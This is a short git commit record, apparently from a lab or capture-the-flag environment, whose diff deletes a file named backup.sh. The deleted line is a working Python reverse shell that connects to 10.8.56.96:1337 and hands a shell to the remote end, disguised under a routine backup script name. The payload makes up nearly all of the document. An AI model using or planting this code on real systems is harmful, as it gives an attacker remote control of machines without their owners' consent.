6722e5f4eaf6b5d38876c802c55781ab0dd83cd6
H3X-007 <h3x.php@gmail.com>
2023-09-07 19:46:18 +0100

    Updated

--- backup.sh
+++
@@ -1,1 +0,0 @@
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.56.96",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
